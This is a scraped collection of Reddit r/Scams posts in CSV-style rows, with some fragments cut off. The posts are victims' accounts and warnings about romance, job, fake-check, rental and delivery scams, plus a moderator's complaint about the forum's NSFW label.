1697588607.0,Is my friend about to be scammed?,"Friend of mine from back in Uni (before we moved separate countries) met a girl. 

I feel she's out of his league, but didn't  want to judge.
He's at best a 4. Low income.
She's easy a 8+ wealthy. (Home owner drives a Lambo).

She's apparently into crypto trading and that's how's she made it big. Wants to help him make a portfolio. She been slowly getting him into it over the past 2 months.

Today he messaged me asking me to join in saying she's told him of a trade coming up on Friday that will be big. But he needs to put up 1000usd and she'll match it with him.

He's asking me to do the same but at 100usd and hell match me too.

Is he being scammed, is he now in on it scamming me? Can trades be predicted that far in advance? What the perpose of matching deposits? 

I'm personally not doing it as there are far too many red flags and I don't know anything about crypto. Should I express to him I think he's being scammed/baited?",Scams,939,183,32,1
1697585691.0,Just Delt with an AirBnB Scam anyone can do and they won’t do anything about it….,Apparently you can instant book seasonal rentals to get the monthly discount and hold the host hostage with their free cancellation policy. It cost the host 10% to cancel an instant booking so a situation like this can hold up any bookings for their peak season. The host either has to pay 10% of the booking fee or risk loss in being able to be booked when they need it most. I was asked to pay half of the fee or else they wouldn’t cancel and Airbnb wouldn’t do anything to help.,Scams,481,92,4,1
1697586078.0,Spam caller knew my name and 'address' but it gets weirder....,"First off I am new to posting on Reddit so please bear with me, If this is the wrong place to post lmk. Earlier today my girlfriend had been getting spam calls from the same number from one of the surrounding cities near us. Although this isn't unusual and is mainly ignored she decided to answer on the 5th call(This is where it gets weird). When she answered she was greeted with ""Hello is this \_\_\_\_\_(MY NAME)""  and of course she said no, then the scammer went on to say  "" Does \_\_\_\_\_(Me)  live at \_\_\_\_\_\_(My Girlfriend's address) which she replied with ""no, I think you have the wrong person""

I have gotten my fair share of spam calls and such but this one is abnormally weird to me as I have never seen information match up like this. 

The main reason why I think this is weird is how they got my girlfriend's number with my name and my name attached to her address, the only reasonable explanation is they somehow got that info from the Amazon package I had shipped to her house for her sister a couple days prior, but It still doesn't add up to me because how did they get my girlfriends number.

Another thing I would like to mention is the ""scam caller"" supposedly sounded southern. my girlfriend described it as ""Yeehaw"" southern. I live in Canada and I can assure you no one sounds like that up here.

If you have any explanations please let me know.",Scams,1377,254,27,1

She says to not ask her that and if I do, I will be blocked. So of course, I ask her the same exact question again. No nudes, no explicit talk. 

She proceeds to open the message, screenshot our entire conversation along with my profile, then says something along the lines of “You were just caught trying to SOLICIT A MINOR. The conversation has been recorded and sent to the authorities.” I immediately type “???” and basically call her crazy, then proceed to block both her accounts.

This is a scam, right? Just a bit curious because she didn’t ask for payment immediately.

1697548506.0,Warning: a new job scam on indeed,"It's really quite clever.... I've been unemployed for quite a while now and starting to get a little desperate as we seem to be heading into recession. So I try to apply for as many jobs that I'm qualified for as I can. Which means I'm often using easy apply on indeed. I admit I don't always scrutinize the job post and research the company before applying. (My bad.) So last week I applied for a job at a company that appeared legit at first glance. Yesterday I received an email from a supposed recruiter from a different company who said she found my resume on a job board and they had a job she thought would be a good fit for me and she provided the company name, hiring coordinators name and an email address who I should reach out to if I was interested in pursuing. There were several red flags in the email message that made me suspicious so I decided to do more research. I looked up the company listed in the email and they are real. Then I looked up the name provided in the email on LinkedIn and yes, she is an actual employee at the actual company. However when I did a job search on the company website, the role I was contacted about was not listed. I sent the hiring coordinator a connect request through LinkedIn to let her know I was interested in learning more about the job. She responded that she does not know anything about the job, there is no such opening at their company, etc. So the scammer picked a real company and a real person, set up a fake email address and was impersonating them. 

When I went to report the job post on indeed it had been taken down. But I could see more than 2100 people had also applied for this ""opportunity"" and I imagine we all received that same email. I wonder how many other job candidates took the time to research like I did, before responding to the fake email. And now this scammer has all the personal contact info and work histories for 2100+ people!!!! What do you think they're doing with that info? Besides indeed (who I highly doubt is going to do any kind of investigation), is there anyone else I should be reporting this to?

1697549528.0,That sudden realization moment,"I used to be quite big in the scambaiting community back in the mid-2000s and on toward the end of the 2010s. I mainly dealt with the West African 419ers, and became very knowledgable about all of their modalities and approaches, but I got burned out doing multiple baits (getting some cool trophies in my time), and also dipping my toe into victim support. In short, I reckoned I was quite good about spotting a scam.

However, go back a handful of days to the middle of last week and you will find me getting ensnared in what I now know is a scam dealing with creating NFTs, but only suspected it was such this morning when a moment clarity broke through and I started investigating the website, the user who initially contacted me, and other ways of checking out the legitimacy of whom I was dealing with.

The strange thing is... it never felt like a scam when I was sitting there converting my GBP to ETH and preparing to send it to the scammer's wallet. I was fully believing that, when the process was over, I would get a few extra £s for the artworks I now create as a hobby and pastime. I suspect it was because I was not sending my GBP directly (in the form of Western Union or Moneygram orders, in the case of what the WA scammers would insist a victim use) and instead it was this rather unfamiliar ETH thing. I guess that second level of converting my GBP into something rather ephemeral and insubstantial helped, I now believe, to remove the idea that I was dealing with money I would never see again. The intermediary level between me and my bank account lessened the impact at the time.

So yeah... I'm now sitting here just shaking my head and rethinking the email conversations I had with the initial roper who pulled me into the thing, wondering which clues I should have spotted much earlier. Sure, looking back now, I can spot a few hints here and there that I should have probed further, but at the time, because that extra level of dealing with cryptocurrency rather than hard, solid cash, or even figures in my actual bank account, it helped blind me to what was taking place.

Just writing this out, I can feel a little better and less angry. Angry at the scammers and angry at myself.

So yeah... if anyone approaches you, through whatever means, and asks if you would like to make some of your digital creations into NFTs and they will then buy them from you... stop and check them out before going any further. And remember... underneath the shine and glamour of fancy new technologies, cryptocurrency still requires actual currency from your bank account in most cases if you want to use it for anything.

I'm still a little bit annoyed and angry, though...

&#x200B;

EDIT TO ADD: I still have them believing I'm a credible victim (well... I was! But you know what I mean, right?) and I haven't burned them yet but have come close just to vent that anger I'm feeling. However, I might be able to have more fun if they believe I am likely to throw more ETH their way. A scambaiter can retire from the hobby, but the hobby never fully leaves you.",Scams,3074,563,78,1

1690298433.0,A scam case in Arg,"
What's up friends. This week I have witnessed several scam cases, some solved and others not. But yesterday I witnessed a scam done to a great friend, who was making purchases for a venture. Yes, looking for a way to earn a daily bread in a country as complicated as Argentina. 

Now I will explain the case. As I said, starting his venture to have a clothing store, he made an online purchase with a person who had a somewhat strange profile. She decided to make the purchase (+$40,000). 

We found out about the scam when the receipt number never reached us and he blocked both of us on Whatsapp. I ask for your help because I want to put an end to this misfortune and do some Justice. In a situation as complicated as the one we are experiencing in this country, it is a very low blow. Not only for us, for everyone, suffering misfortunes of this kind is horrible.

1597890991.0,I am engaged to a scammer,"Strange guy wrote to me on Facebook. Obvious scammer profile, down to the stolen photos. I decided to have some fun with it and friended him back. He quickly “lured” me over to Google Hangouts where he told me his sob story of being a widower with a son and living a lonely life in “the south sea of Ireland.” We got engaged on day 1 of chatting.

He asked me for a gift card. I sent him a photo of a used one. He asked for a replacement. I said that I tried to buy it but store security wouldn’t let me. He asked for $5200 so he can come home to the US and I said, “Sure!” He asked me to mail the money to a friend of his in Georgia. Makes perfect sense, I agreed.

He wanted a photo of the cash. I faked one. He wanted me to send the money overnight via UPS. I claimed I did. He asked for a receipt. I said they didn’t give me one. He demanded I get back the envelope of money so I pretended I did. He told me to mail it again, this time via FedEx. I put a couple Pop Tarts in a padded envelope (so it would weigh a few ounces and he might believe I actually sent the cash because the receipt lists the envelope’s weight) and mailed it via the post office instead of Fedex and to a different address, same zip code, as the address he gave me so that it would appear to be delivered. (The post office tracking will say delivered to the right zip code but won’t specify the address.) Apologies to the very confused stranger who is about to receive an envelope with two crushed Pop Tarts in it.

He thanked me for sending the money and providing a tracking number, then panicked when he suddenly realized I sent it thru the post office. I guess his plan was for his friend to steal the UPS (or Fedex) delivery off the doorstep upon its arrival? But the post office, which I used, would place the mail in a locked box seeing that the address he gave me was an apartment. And his friend must not live in that apartment/have the key to its mailbox.

He is now demanding that I go to the post office and get the envelope back. I said I’d try. You know, after I finish laughing for a few hours.

1682791172.0,I got scammed in China (and I liked it!),"A while ago I was in Shanghai for a work visit.  Having some free time, I decided to walk on ""the Bund"" (the touristy boardwalk with a beautiful view of the city).  While I was there a woman approached me and asked me to help take a picture.  No problem.  Then she wanted to practice her English with me.  I was alone and she seemed very nice, so we chatted. She was a ""teacher"" who was visiting town for the weekend.  

She wanted to know if I was interested in visiting a traditional tea house nearby that she was hoping to check out.  I said yes, but I was a little concerned.  I'm a married man and I didn't want her to think I was going to be doing anything untoward but it was all very friendly and relaxed.

Anyways, we got tea and it was really great.  I learned a lot about Chinese tea and had a lovely friendly conversation for an hour or so.  The tea was tasty and the service was friendly.  

The bill came and it was pretty steep for a bunch of tea.  About 40 bucks.  Regardless, I paid my share and we said out goodbyes.

I told somebody else at work about the experience and they explained to me that this was a tourist scam: it's called the teahouse scam.  It was all a setup between the teahouse and the woman who I went with.  Presumably, she gets a cut of the profit from the visit.

Regardless, I don't regret it, though I feel a little foolish.  I had a nice time, some lovely conversation, and I learned a lot about tea.  The money was a lot, probably, but it was definitely worth it for both the experience and for the story about getting conned.

1665498478.0,"I’m a professional banker, and I have some thoughts","I’ve noticed a lot of misinformation floating around on this sub. I’m not here to call anyone out, but just for example, I saw someone telling a person to never accept a cashier’s check because they aren’t secure. To briefly clear that one up, a cashier’s check, otherwise known as a treasurer’s check, is paid for by the customer at the bank with either cash or a direct pull from the customer’s account. That way they’re considered guaranteed funds, and that’s exactly what does make them secure. I personally would never accept a large transaction like that in cash due to the risk involved with simply having that amount of cash on my person. 

But what if it’s a fake check, you ask. Well the answer to that one is simple: if you get a cashier’s check and you’re not expecting it, it’s most likely fake. If you’re expecting it and you get it but you’re still not sure, this is how you clear it up: have your bank call the issuing bank and verify it. Cashier’s check sales come from a bank’s general ledger account, and they’re all logged. They can look up the check’s serial number and verify whether or not it was actually written by someone at the bank. You can also request a hold be placed on the funds, so it’s untouchable until it’s been long enough for the check to officially clear or be rejected. 

That’s just one example. Whenever I see stuff like that, I do try to politely interject and just make sure the information is corrected. I noticed that a lot of times when I do this, my comments get downvoted to oblivion and/or people are extremely rude to me. It’s made participating here unpleasant at times, even though I am passionate about helping people avoid scams. 

Bottom line and the actual advice here: this is a great place to *start.* This a good forum to run things by to see if it’s really a scam and how it works, but if you have actually been a victim, I *strongly* recommend that you get your advice on how to proceed from your actual bank. We’re trained in how to deal with this stuff, and we want to help you. Please don’t stop at just taking advice from a stranger on the internet. Reach out to your bankers and be honest with them about everything so that they can help you to the best of their abilities and possibly also get law enforcement involved. Thanks!

Edit: to those of you who read the whole post and understood that I’m merely saying to ask a professional before you do something risky or to contact a pro if you’re already caught in a scam, thank you! To those of you who only paid attention to my example and came here to be weird and bitch about checks - that’s not even the main point of the post, it’s just an example. 

To those who don’t have any professional experience with this but want to argue, perhaps you should get some educational material before spouting off.

1684166822.0,Hubby spent two hours on a phone interview this morning before he realized it was a scam…,"…and thankfully, hung up immediately. 

Hubby got canned in a round of corporate layoffs about 4-5 weeks ago. He’s been vigorously applying to stuff since, with varying degrees of success. 

This listing didn’t show a salary range. Red flag #1. 

He was still curious, since it was an at-home data entry job. He got called this morning by a lady while I was still asleep (he’s the early bird, I’m the night owl) and spent two hours being “interviewed”. He asked about the salary and she said it was “commission-based”. Red flags #2 & #3: Indeed doesn’t allow commission-based listings to be listed as salaried (which it did), and why would a data-entry job be commission-based anyways? 

 Then she starts talking about the equipment he’ll need to purchase, including a brand new, high-end MacBook with Retina display. Red flag #4. 

She says they’ll provide him with “LiNkS tO tHeiR vEnDoRs” and *swears* the company will reimburse him— 

Final red flag. Hubby hangs up in a rage, realizing he lost two hours of his life he’ll never get back. He immediately reports the listing as a scam to Indeed. 

When recounting it to me just now, he says that he did a quick google search of the company she claimed to represent, and it’s legit. I told him, “Yeah — but they’re counting on you doing that to make you believe the job is legit as well. Any links they provide you will be created by the scammers and mocked up to look like the company’s.” 

Him: “And I’d be stuck with new equipment I don’t need.”

Me: “Heh. Bold of you to assume it’ll arrive at ALL.” 

He also looked at the email they’d sent him and kicked himself for not noticing it didn’t come from “@legitcompany (dot) com”, it came from some other random, unaffiliated email server. That would’ve been another red flag. 

He’s angry that he lost two hours of his time — but even more enraged that these scammers are preying on people who’re probably already in moderate-to-dire financial straits and leaving them in an even worse condition. I told him that at least he wasted HER time in return. It was less time she could’ve spent scamming someone who *wouldn’t* have recognized it was BS and thus been out several thousand dollars.",Scams,2194,386,41,1
1688737753.0,"""Final Warning"" from the Reddit Admins","Two days ago, we received this message from u/modcodeofconduct: 

> We noticed you recently marked your community NSFW. This action is likely to confuse your community members, as people subscribe to communities based on the content at the time of subscription. This is a violation of the Mod Code of Conduct rule 2.

> While we recognize communities can gradually change as they grow, when your content suddenly changes from generally safe for work to sexually explicit, it harms the community members.

> While we can see you haven't taken the step of approving sexually explicit content, we need to separate your community from the communities that abruptly become NSFW and post sexually explicit content, situations in which we immediately take action. Please immediately correct the NSFW marking on your subreddit so that we can separate your community from those violating sitewide rules.

> Thank you.

We responded back in kind, pointing out that we were compliant with their own listed rules. We asked them to clarify. We pointed out the rule-breaking content we have removed. No response (as usual. They always dish out these scary-sounding messages, but never respond. Strange!) 

And yesterday, they sent us this: 

> This is a final warning for inaccurately labeling your community NSFW which is a violation of the Mod Code of Conduct rule 2. Your subreddit has not historically been considered NSFW nor would they under our current policies.

> Please immediately correct the NSFW labeling on your subreddit. Failure to do so will result in action being taken on your moderator team by the end of this week. This means moderators involved in this activity will be removed from this mod team. Moderators may also be subject to additional actions, e.g., losing the ability to join mod teams in the future.

> Lastly, if you suddenly begin to post, or approve content that features sexually explicit content to your community in order to justify the NSFW label, we will immediately remove and permanently suspend moderators who have participated in this action.


-------------------------

This is the last message we have received from u/modcodeofconduct regarding this sub, regarding the NSFW status of the sub. 

It has been discussed prior to the protests making this sub NSFW due to the content posted here. Prior to the protests, mods removed content as reports came in, when mods could get to it. This means that sometimes sub/site rule-breaking content, offensive content, sexually explicit content, and otherwise inappropriate content remained up for very long periods of time.

Reddit's own words about offensive content: 

>Rule 2: Set Appropriate and Reasonable Expectations Users who enter your community should know exactly what they’re getting into, and should not be surprised by what they encounter. It is critical to be transparent about what your community is and what your rules are in order to create stable and dynamic engagement among redditors. Moderators can ensure people have predictable experiences on Reddit by doing the following:

> Providing a clear and concise description of the topic(s) discussed by your community.

>*Properly labeling content and communities, particularly content that is graphic, sexually-explicit, or offensive.*

> Creating rules that explicitly outline your expectations for members of your community. These rules will help your community understand what is or isn’t permissible within your subreddit.

> Explicitly marking your community as “unofficial” in the community description if the topic concerns a brand or company, but the community isn’t officially affiliated.

And, the content policy: 

> NSFW (Not Safe For Work) content

>Content that contains nudity, pornography, or profanity, which a reasonable viewer may not want to be seen accessing in a public or formal setting such as in a workplace should be tagged as NSFW. This tag can be applied to individual pieces of content or to entire communities.

Due to the loss of most of our mod team and needing a way to better moderate with less people power, we made the decision to have to manually review and approve all comments and posts. While this has lead to longer wait times for you all, it has allowed us to keep rule-breaking and offensive content OUT of the feed. You never, ever need to see it. 

A small example of some of the content I have personally removed from the mod queue in the past week:

- Countless reposts of common escort scams, underage sextortion scams, and other content focused on sex/pornography/sexting. 

- A post I reported to Reddit admins, where the poster was advertising photos of individuals performing anal and PIV sexual acts, and advertising for an extra fee to see ""teen"" performers on Telegram. (""Teen"" likely implying individuals under the age of 18 years old.)

- An uncensored gore photo of a man who was killed and dismembered, with his penis and testicles also dismembered and visible in the frame. 


Reddit's own rules about NSFW content state that we are compliant with their policies. However, Reddit is choosing to strong-arm us into complying or removing us from our moderator positions. 

I don't think I need to remind you all of this, but we are *unpaid volunteers* for reddit. We, and thousands of other mods, provide hundreds of thousands of hour of *free labor* to this site, doing the work that their paid admins and employees should be doing. 

The admins apparently think that this sub is safe for work, when examples of content like I have posted above are being posted *every day*. You cannot believe the amount of uncensored gore photos over my past 6+ years of being a member of this community I have seen and personally removed. The amount of sexually explicit posts and comments I have removed. *The absolute vile garbage I have removed from truly depraved individuals seeking to victimize and take advantage of the most vulnerable populations of human beings.* 

The fact remains that scams prey on the vulnerable, the naive, the desperate, and the uninformed. They rely on tactics to persuade people to do things in exchange for a big prize. A lot of these tactics depend on utilizing sex, shame, and embarrassment to get victims to pay out (perfect example: a person sends a picture of their penis to a scammer, and then the scammer threatens to send that photo to all their friends and family.)

Please tell me- how is reading a post like that ""work-friendly"" content?

So, if we are forcibly removed, this sub is forcibly switched back to SFW, and you see content like the types of content I removed this past week, just know it is endorsed by the admins as safe for work!",Scams,6678,1101,126,1

I phone her back and she says her dad found the phone and gave it to her because she is more tech savvy. She was able to determine it was my wife’s phone by three photos that she could see on the Home Screen, one of a Facebook profile that says her name. She said if I can unlock the phone, I can have it and gave me her address.

In a nutshell, I've been using my Social Security number fraudulently. I had 10 minutes to call the government back this morning and work this out before they would send their agents to arrest me. So here I stand.

Why didn't I call back and hopefully avoid this mess? Because I was on the phone with a Microsoft tech in India, trying to grant him full access to my Windows 10 OS, which was rife with malware and spyware. It was super kind of him to call directly and warn me, but that's why I was tied up and missed the government's call.

This throws another wrench in my life: I am currently subject to a deportation order for not paying $8,000 to INS to correct critical errors on my visa. I've overstayed my welcome in the US by 36 years, and likely will be sent back to China in short order. I should've taken those Mandarin classes.

I just hope the agents are gentle with me, due to my limp. USPS isn't delivering the medical-grade knee brace I'm entitled to for another few days.

For all those worried about my family's finances,  do not fret. I just consolidated my student loan debt, and Barrister Henry Adams has USD $2,000,000 set aside for me in a bank account in Lagos. Additionally, my house qualifies for amazing financing on new solar panels before state incentives expire in 2020.

When I get this all straightened out, I'll take my free cruise to the Bahamas. Until then, I hope you've enjoyed all the scam spam I've recieved in the past 24 hours alone.",Scams,1744,322,56,1

Not surprised given what they are asking for rent. The company that owns it has done a bunch of renovations though, it is looking nice. 

All of a sudden yesterday there was a steady flow of potential renters looking at the house.  It's one of those self-tour things, sign up for a time and they send you the lockbox code.  One family knocked on our door and asked me if we knew the owner.  I told them it's a corporation, but I don't remember off the top of my head.  They had been texting with some guy who wanted them to cashapp the deposit.   And the rent was half the market rate. 

Been here long enough to know instantly that was a scam.  Asked my better half and she remembered the company's name. Looked it up on the county records to confirm.  We called the company and let them know about the fake listing. I'm guessing they changed the code, almost every daylight hour since someone has been standing outside unable to get in for their ""tour"".  I've now stopped over a handful of people from getting scammed.  Some have driven over 2 hours to see this place. 

I stuck some signs up on the door warning of the fake listing, with the company's approval.  Reported the fake listings I found on rent.com and apartmentfinder. They're still up.

I was at a gas station getting gas as you do when some guy in an official looking polo (with a logo) comes up to me and says, I kid you not...

My brain literally short circuited. I just couldn't believe it. I had heard about this scam back in the 90s but ever since the internet I just figured it wasn't a thing anymore... 

Honestly I wish I had had a better response but I was too stunned. I just politely declined and they moved onto the next person. 

For those who may not know here is how the scam works: 

They come up to you in a parking lot usually and tell you they have an extra something in the trunk. They will look and act official like they are part of a company or something.

 Could be a TV, stero system, or apparently a home theater. It's usually electronics but doesn't have to be. 

They rope you in by seeming to be giving it for free but then they spin you by saying they will sell it to you at discount ""just because they have to get rid of it before end of day."" 

Then they will show you a ""retail price"" for the item and make it out like they are cutting you a deal. 

Really the product is either broken or cheap AF and you'll actually end up paying more than it's worth. Or it's stolen goods. 

Thats the jist anyway.

EDIT: Some of y'all have pointed out that this technically isn't illegal, and while yeah you may be right it's still a scam.

If you are selling a product for more than its worth thay is a scam, even if you technically didn't break the law.",Scams,1647,325,49,1

She’s elderly and was going through a hard period of losing two siblings within 6 months. For months this person convinced her he needed help and she feels very validated helping people so she did it.

Pretty sure he’s from Nigeria. (The Facebook page they run said managed in Nigeria lol.)

Now: This ended six months ago but I recently found out he somehow was contacting her again. So I went through my moms phone with her and blocked their contact and all the apps they could contact her from. (Google Chat, Facebook, and email).

The scammer knew it was me that ruined his game and sent me the attached message. (He found me on MERCARI of all places??)

Obviously the message was very startling. Should I be worried about my safety? It’s pretty easy to find info about me online.

My mom gave me her phone to delete apps, change her Apple ID, delete her FB account, and change her phone number. I live 2 hours away so I ended up having her phone for over a week. In that time she didn’t have any messages from the scammer.

TODAY like minutes after she gets home from picking up her phone from my house, she gets a text from them. Is that just an insane coincidence? Could they be tracking her and knew she was home? How did they get her new number?

1622814855.0,Update 2 to: My mum (77) is currently at a hotel in the airport flying out to Nigeria.,"Edit: [Link to original post](/r/Scams/comments/nqgjy0/my_mum_77_is_currently_at_a_hotel_in_the_airport/)

OK, lots of developments since my last post.

First I'd like to remind everyone that this is happening in the UK.  A lot of the replies I had were giving US-centric advice, which I know came from a good intention and I thank you for that but please take our location into consideration when providing advice.

I had been tracking her phone yesterday, saw it moved from the hotel into the airport, and then went offline.  I assumed this was her getting on the flight.

I had a call from an officer at the airport yesterday evening.  She had been denied boarding at the airline because she had not completed a visa.  She thought it was something she could do on the plane, or when she landed.  The police became involved and went through the same process as all the other times she's recently had police intervention.  Again, she has convinced them that she is in full control of her faculties, she knows what she is doing and is certain she wants to do it.

So she's checked back into another hotel at the airport, and will begin the act of obtaining a visa.  I'm not entirely sure of the process for this but if it involves a visit to the Nigerian Embassy in London then I hope they will be able to see what's going on, assuming she tells them the truth, and perhaps deny her a visa or at least add themselves to the long list of people who have told her she's the victim of fraud.

She's still not answering our attempts to call her but has begin responding to text messages, so that's good.  Family are all trying to stay positive and friendly with her despite us being extremely angry, just one of the several stages of grief we've all experienced this week.

Our conclusion is that we cannot stop her.  She is determined this is what she wants to do, and is totally convinced it is not only the *right* thing to do but the *best* thing to do.  She has been convinced that we do not love her, and it is to our benefit if she leaves.

... 6 hours later ...

At this point I had stopped writing this update because a message came through on our family WhatsApp group from my younger sister:

""Mums on the phone she's coming home has realised it's a scam""

My older sister asked:

""Why does she think it's a scam now?""

And the reply:

""None of her cards work, and I think she's sussed it with all that's happened.  Hotel are talking to police now.""

So my younger sister and my older brother jump in a car and start driving to London.  They have since arrived and met with mum and the police, and I'm not sure exactly what's going on until I get an update from them.

The police are trying to recall the package of personal items she shipped through an international courier.  I'm still not entirely clear what happened with the bank today, whether the scammers took money, or my mum transferred it, but however it's happened the transaction either failed or has since been reversed by the police working with the bank's fraud team.

A recent update from my sister says:

""Got her.  She still believes he was not stealing from her.  The only reason the bank stopped the payment is because she'd put the wrong address!! 🤬🤬🤬""

I have called Victim Support but, just like the police, they can't really do anything unless the victim themselves consents.  The local office is closed for the weekend so it will be next week before I can sit down with mum and talk to them.

Mum is going to stay with my sister for 2 nights, but then my sister has to isolate to prepare for surgery next week.  We'll get mum back into her flat and I will stay with her for a while.  Can't do that forever though, I have my own life, family, job.  We need to undo all the harm she's done, contact all the companies she has ended contracts with, reverse change-of-address details, and quite possibly find her somewhere new to live now that most of her money is gone.  

When I get the replacement Lasting Power of Attorney papers though I will be enacting them to the full extent and taking control.  I will need to treat her like a child when it comes to internet access, and for her access to money.

This is just the beginning of rebuilding her life.  There's so much more I've not even written in these posts yet, and I'm certain there will be more to come.

1654271517.0,My MIL is sitting in a Nairobi hotel waiting for the swindler to marry her,"This is an update on a story I've shared earlier where my MIL met a man online and suddenly left to travel  to Kenya to meet him.

MIL did come back home temporarily. She refused to sign any power of attorney papers and the advice we received was that ""you can't stop someone from making poor choices"". Well basically we couldn't do anything legally.

We tried to talk her out of returning and make her see sense that she is being swindled. But the more we tried to stop her, the more distant she became. She pretty much cut everyone off. She keeps in touch with only one family member who placated her to ensure they could stay in touch. This person has provided me the info so I can give the update of what she is doing. 

So here's her story:

She did return to Kenya. But first she packed up all her  household furniture and sent that across to Kenya too.  7 weeks and it hasn't arrived yet. Nevermind, they say it will arrive soon. Hopefully they will have a house to put all the furniture into.  They will have to get a house soon. Once they are married!

The date is not set yet but she is excited. She is renting a room in Nairobi in the meanwhile. She spends most of her days passing the time looking at wedding dresses online. She is too scared to venture out of the hotel if he doesn't accompany her . Nairobi is a big place and she is 77. It's difficult to get around. When he is there, he makes her feel secure. He is the best man she's ever known. A good Christian and a hardworking 40 year old man. But unfortunately,  he is away a lot and she is on her own most of the time. So she doesn't get out much at all.  

He is head chef at one of the best hotels in Nairobi  and he is committed to the job. He needs to be there  24-7 many days of the week. Now he is employed again he might be able to  pay back the $130k he borrowed from her. He really got it as a loan, no wait, it was a gift. He needed it. It was for his jail bail- he was wrongly accused. He had long covid and the operations, the sick kids. It was lucky she gave him the money or he could have died. And it's lucky too his kids can now live with his sister. Really, thank god for the sister taking them or he wouldn't be able to work if he needed to look after kids.  Soon he won't need to work so much as they will invest in greenhouses. They will make back the  $130k she lent him in just one year!  Greenhouses is just one option as there are so many exciting investments to make!  Kenya has 7% interest rate so they are set to make money for sure. Soon. It will definitely happen soon. 

But she can't be impatient! For now, each day she is looking for her dream wedding dress online and it's  very exciting as she just got the news the wedding will be free and fully paid for at the big hotel where he works. It's going to be a big wedding full of his family and friends. Nevermind her own children won't go. They don't understand and were all skeptics! She'll show them!!! They will be married. And they will have a new house. And they will be making lots of money with their new investments. Soon. It will happen. Very soon.

1682558010.0,BEWARE VERIZON SCAM,"My good friend is a UPS driver and they came across a scam today on their route I wanted to share with you all. 


There was a phone being delivered to a residential address and before they even got to the address, a man approached the truck asking if there was a package for a certain address. 

My friend, the UPS driver, did indeed have a package for that address. Per protocol, they asked to see this man's license. 

Instantly, my friend was suspicious because a) the license had no watermark and looked fake and b) the package itself  (a phone from Verizon) was addressed to an name that was Indian. The man in front of him looked most likely Hispanic. 

So our dear Driver says ""sorry I can't hand you the package now, I must deliver it to the address.""

The guy is pausing, asking the driver to call their boss, asking what time they will be around. Driver finesses all the questions. 

Makes their way to the address, and a woman answers the door. The driver tells her that next time she orders a phone, she should have it shipped to the store for pickup and confirms with her that yes, she does have a husband but it did not match the description flagging the truck down and asking for the package. 

Our friend, the driver, calls their supervisor and the supervisor confirmed that this is an inside job. Basically, someone at Verizon is tracking the phones that are being ordered. Someone is going through the trouble of printing a fake ID and via Verizon, has the tracking # for the phones.

Tl, Dr: Inside job being done at Verizon for people ordering new phones shipped to their house. They are printing fake ids and have a tracking # and are stopping UPS drivers en route to try to pick up the packages before they reach the residence and are potentially scouting these houses to get your phones before you do.

Edit: Thanks for everyone adding their experiences and I just want to clarify that we have some commenters claiming to be former Verizon employees, some saying this is not possible from Verizon's end and may or may not be part of a 3rd party scam. Some saying it is someone who may or may not be working for the company but has access to customer info/ email and it snowballs from there. 

Either way, I hope phone companies can come up with some better methods for new  phone deliveries that are more secure for the customer. But as for me, all phone companies can kiss my ass 😒",Scams,2406,441,45,1

She gave the scammer my information, so she's put me in harm's way, and has also likely put our child in harm's way. I feel like we're marked now, on top of everything. We've been alternating between crying, scared, fighting, and are in shock.

I don't know how to be supportive right now, and am so mad that she's done this to our family. I'm seriously considering leaving her, at least temporarily, until we can find steady ground again. I have some shame feeling this way, I feel like I should have unending sympathy and support for her... but I just don't. She dragged me and our child into this, didn't stop to think, and harmed us all. I feel horrible saying this, but it makes me question our future together. We've been scrupulously budgeting for years, saving money wherever we can, and 10 grand disappeared overnight.

Does anyone have any experience in either being the partner of someone that was scammed, or who was scammed and has a partner that got through it with you (or didn't)? Any advice for dealing with the fallout?

I haven't had the time to reply since yesterday, was dealing with the fallout of all of this at home. I'm still at home, my wife and I have managed to sit down and actually talk a bit about what happened, and are trying to chart a course forward.

I appreciate the (mostly) kind words, and can understand the less than kind ones as well. We are going to try to heal through this together, but need to get over the initial shock first. I'll try to respond to a few more comments here, to add clarification and detail.",Scams,3434,614,125,1

1689940826.0,My husband almost got scammed. Luckily I overheard him on the phone and stopped it,"I woke up this morning to the sound of my husband's voice. It sounded like he was downstairs in the kitchen. He was talking loudly, sounding frustrated, but it was a one-sided conversation. I figured he was on the phone with someone, but I couldn't make out his words.

After a minute or two, I went downstairs. When he saw me, he said, ""Honey! We have a dishwasher in Ohio! We were charged $400 for it!""

I asked him, ""Why are you trying to buy a dishwasher?"" (Ours is less than three years old)

He replied, ""I'm not!"" and he waved me off.

I went back upstairs, back to bed (I worked the night shift last night), but I could still hear his increasingly loud and frustrated voice, so I went back down. I just sat next to him and listened for a few minutes. 

I finally figured out that someone had contacted him that he had purchased a dishwasher through Amazon, but it was stuck in transit in Ohio (we live in Arizona). Side note: the email sender was not Amazon, but a jumble of letters and numbers. Anyway, they were trying to get him to install an app that would let them control his phone so they could access his bank account to ""reverse"" the transaction. 

Finally, I said to him, ""Show me the charge they are trying to reverse."" He told the caller to hold on a minute. He showed me an email whose sender name started ""jxtsg"" and I said, ""You are getting scammed!"" so he hung up. 

Of course, ""Amazon"" never contacted him again, but I think they were trying to get access to our bank account!

I know, I know!!! I told my husband to never do that again and to let me in on these types of conversations. He is a very trusting soul. 🤦‍♀️",Scams,1644,312,66,1
1642035397.0,"I was scammed by a fake job offer on Upwork. I spent all day interviewing, got sent a fake check, and almost sent $2200 off my own money to a third party ""vendor"" in order to buy home office equipment","Annoyed, but I figured I should record the scam as it was new one for me, and super elaborate (compared to scams I've experienced before). The[ fake job posting is still up](https://www.upwork.com/jobs/~01c541b3b3c88a2665) at the time of this posting.  

I was invited to look at a job by a ""recruiter"" on Upwork, the job posting looked good so I spent a proposal, my proposal was accepted and I was offered an interview.

I was sent an email address from a ******@savershrm.com - I googled ""savershrm.com"" and it resolved to Savers.com. That was the first red flag that I missed. 

The interview was done through the Wire app, and it was done via text, which was the second red flag I missed. 

The ""interview"" took over an hour, and I was surprised by the incompetence of the interviewer (third red flag) but I also figured that recruiters don't understand graphic design. I had multiple moments where I thought, ""Haha, this person is a moron. I am playing them like a fiddle."" 

After the ""interview,"" there was a two hour period where my answers were ""reviewed"" by the board of directors. I was then offered the position, and sent a [fake contract](https://imgur.com/a/UFgaem1). 

Then, my new fake boss explained that I was supposed to purchase office equipment, and I was sent a [fake check](https://imgur.com/a/jqmBZzp) that I was asked to print out and deposit via my mobile banking app. Are we still counting red flags?

Let me tell you, my dumb ass tried to deposit this low res fake check about 6 times, and at *no point was I suspicious*. I was stoked for my new job, and offered to cover the cost of the office supplies with my own money, with the plan to deposit the check in person at the bank tomorrow. 

